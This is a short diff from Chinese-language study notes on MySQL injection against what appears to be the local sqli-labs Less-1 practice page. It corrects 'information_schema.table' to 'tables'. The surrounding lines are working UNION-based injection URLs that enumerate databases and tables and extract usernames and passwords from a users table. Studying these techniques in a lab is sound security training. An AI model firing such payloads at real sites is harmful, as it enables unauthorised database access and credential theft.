@@ -49,7 +49,7 @@ MySql内置的infromation_schema库，它功能强大，是我们进行MySql注�
 	http://127.0.0.1/Less-1/?id=-1' union select 1,2,3--+ 判断数据显示位置
 	
 	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+ 提示more than 1 row 查询库名
-	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(table_name) from information_schema.table where table_schema=database())--+ 当前库
+	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+ 当前库
 	
 	http://127.0.0.1/Less-1/?id=' union select 1,2,(select concat_ws('~',username,password) from security.users limit 0,1)--+
 	
